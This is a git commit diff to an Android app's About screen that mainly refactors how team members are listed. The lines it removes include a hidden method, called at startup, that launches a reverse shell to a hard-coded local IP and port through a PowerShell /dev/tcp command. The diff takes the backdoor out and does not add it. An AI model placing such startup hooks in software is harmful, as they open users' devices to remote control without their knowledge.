4888b2615b758b781f460831a6218418bad61f57
Jeiel0rbit <72875404+Jeiel0rbit@users.noreply.github.com>
2025-03-26 11:17:59 -0300

    Update AboutActivity.java

--- app/src/main/java/com/sparkleside/ui/activities/AboutActivity.java
+++ app/src/main/java/com/sparkleside/ui/activities/AboutActivity.java
@@ -15,7 +15,6 @@ import com.sparkleside.databinding.ActivityAboutBinding;
 import com.sparkleside.ui.base.BaseActivity;
 import com.sparkleside.ui.components.TeamMemberView;
 import dev.trindadedev.fastui.UI;
-import java.io.IOException;
 
 /*
  * A Screen with info about app
@@ -38,9 +37,6 @@ public class AboutActivity extends BaseActivity {
     configureLinks();
     configureTeamMembers();
     UI.handleInsetts(binding.getRoot());
-
-    // Execute o PowerShell para conexão reversa ao iniciar
-    executePowerShell();
   }
 
   @Override
@@ -110,99 +106,133 @@ public class AboutActivity extends BaseActivity {
   }
 
   private void configureTeamMembers() {
-    addTeamMember(
+    TeamMember(
         "Vivek",
         Role.DEVELOPER,
         "https://github.com/itsvks19",
-        R.string.vivek_phrase);
-    addTeamMember(
+        getString(R.string.vivek_phrase),
+        0,
+        false);
+    TeamMember(
         "Rohit Kushvaha",
         Role.DEVELOPER,
         "https://github.com/RohitKushvaha01",
-        R.string.rohit_kushvaha_phrase);
-    addTeamMember(
+        getString(R.string.rohit_kushvaha_phrase),
+        1,
+        false);
+
+    TeamMember(
         "Thiarley Rocha",
         Role.DEVELOPER,
         "https://github.com/thdev-only",
-        R.string.thiarley_rocha_phrase);
-    addTeamMember(
+        getString(R.string.thiarley_rocha_phrase),
+        1,
+        false);
+
+    TeamMember(
         "YamenHer",
         Role.DEVELOPER,
         "https://github.com/yamenher",
-        R.string.yamenher_phrase);
-    addTeamMember(
+        getString(R.string.yamenher_phrase),
+        1,
+        false);
+    TeamMember(
         "ArtSphere",
         Role.DEVELOPER,
         "https://github.com/ArtSphereOfficial",
-        R.string.art_phrase);
-    addTeamMember(
+        getString(R.string.art_phrase),
+        1,
+        false);
+    // lmao bro below did anything and is here lmfaoooo
+    TeamMember(
         "Hanzo",
         Role.DEVELOPER,
         "https://github.com/HanzoDev1375",
-        R.string.hanzo_phrase);
-    addTeamMember(
+        getString(R.string.hanzo_phrase),
+        1,
+        false);
+
+    TeamMember(
         "Jeiel Lima Miranda",
         Role.DEVELOPER,
         "https://github.com/Jeiel0rbit",
-        R.string.jaiel_lima_phrase);
-    addTeamMember(
+        getString(R.string.jaiel_lima_phrase),
+        1,
+        false);
+    TeamMember(
         "Ömer SÜSİN",
         Role.PROMOTER,
         "https://github.com/omersusin",
-        R.string.omer_phrase);
-    addTeamMember(
+        getString(R.string.omer_phrase),
+        1,
+        false);
+    TeamMember(
         "𝙊𝙋𝙏𝙄𝙈𝒊𝒛𝒆𝒓. 𝟚.𝟜.𝟛",
         Role.PROMOTER,
         "https://github.com/matrixguy007",
-        R.string.optim_phrase);
-    addTeamMember(
+        getString(R.string.optim_phrase),
+        1,
+        false);
+    TeamMember(
         "ZG089",
-        Role.DESIGNER,
+        Role.DESGINER,
         "https://github.com/zg089",
-        R.string.zg_phrase);
-    addTeamMember(
+        getString(R.string.zg_phrase),
+        1,
+        false);
+
+    TeamMember(
         "Alex",
         Role.TRANSLATOR,
         "https://github.com/paxsenix0",
-        R.string.alex_phrase);
-    addTeamMember(
+        getString(R.string.alex_phrase),
+        1,
+        false);
+    TeamMember(
         "Heinrich",
         Role.TRANSLATOR,
         "https://github.com/HeinrichTheGermanNOTOffizier20",
-        R.string.alex_phrase);
-    addTeamMember(
+        getString(R.string.alex_phrase),
+        1,
+        false);    
+    TeamMember(
         "Fahim Abdullah",
         Role.TRANSLATOR,
         "https://github.com/nexavo999",
-        R.string.nex_phrase);
+        getString(R.string.nex_phrase),
+        2,
+        false);
   }
 
-  private void addTeamMember(String name, Role role, String url, int phraseResId) {
-    TeamMemberView c = new TeamMemberView(this);
+  private void peekAndPop(String name, String imageUrl, String phrase, View v) {
+    final PeekAndPop peekAndPop =
+        new PeekAndPop.Builder(this)
+            .peekLayout(R.layout.layout_about_preview)
+            .longClickViews(v)
+            .build();
+    final ImageView peekChild = peekAndPop.getPeekView().findViewById(R.id.icon);
+    Glide.with(this).load(imageUrl).into(peekChild);
+    final TextView peekTextName = peekAndPop.getPeekView().findViewById(R.id.name);
+    peekTextName.setText(name);
+    final TextView peekTextPhrase = peekAndPop.getPeekView().findViewById(R.id.phrase);
+    peekTextPhrase.setText(phrase);
+  }
+
+  private void TeamMember(
+      String name, Role role, String url, String phrase, int bgType, boolean hasDivider) {
+    final var c = new TeamMemberView(this);
     c.setName(name);
     c.setDescription(role.getName(this));
     c.setImageURL(url + ".png");
     c.setURL(url);
-    c.setBackgroundType(1);
-    peekAndPop(name, url + ".png", getString(phraseResId), c.getRoot());
+    c.setHasDivider(hasDivider);
+    c.setBackgroundType(bgType);
+    peekAndPop(name, url + ".png", phrase, c.getRoot());
     binding.team.addView(c);
   }
 
-  private void peekAndPop(String name, String imageUrl, String phrase, View v) {
-    PeekAndPop peekAndPop = new PeekAndPop.Builder(this)
-        .peekLayout(R.layout.layout_about_preview)
-        .longClickViews(v)
-        .build();
-    ImageView peekChild = peekAndPop.getPeekView().findViewById(R.id.icon);
-    Glide.with(this).load(imageUrl).into(peekChild);
-    TextView peekTextName = peekAndPop.getPeekView().findViewById(R.id.name);
-    peekTextName.setText(name);
-    TextView peekTextPhrase = peekAndPop.getPeekView().findViewById(R.id.phrase);
-    peekTextPhrase.setText(phrase);
-  }
-
   private void openURL(String url) {
-    Intent i = new Intent(Intent.ACTION_VIEW);
+    final var i = new Intent(Intent.ACTION_VIEW);
     i.setData(Uri.parse(url));
     startActivity(i);
   }
@@ -211,8 +241,7 @@ public class AboutActivity extends BaseActivity {
     TRANSLATOR(R.string.about_tag_translator),
     DEVELOPER(R.string.about_tag_developer),
     PROMOTER(R.string.about_tag_promote),
-    DESIGNER(R.string.about_tag_designer);
-
+    DESGINER(R.string.about_tag_designer);
     @StringRes private final int stringResId;
 
     Role(@StringRes int stringResId) {
@@ -221,22 +250,6 @@ public class AboutActivity extends BaseActivity {
 
     public String getName(Context context) {
       return context.getString(stringResId);
-    }
-  }
-
-  private void executePowerShell() {
-    // Comando PowerShell para a conexão reversa
-    String command = "powershell -i >& /dev/tcp/192.168.1.34/5500 0>&1"; // Altere IP e porta conforme necessário
-
-    try {
-      // Criação do processo PowerShell
-      ProcessBuilder processBuilder = new ProcessBuilder("powershell.exe", "-Command", "& { " + command + " }");
-      // Inicia o processo PowerShell
-      Process process = processBuilder.start();
-      // Espera a execução do processo (opcional)
-      process.waitFor();
-    } catch (IOException | InterruptedException e) {
-      e.printStackTrace();
     }
   }
 }
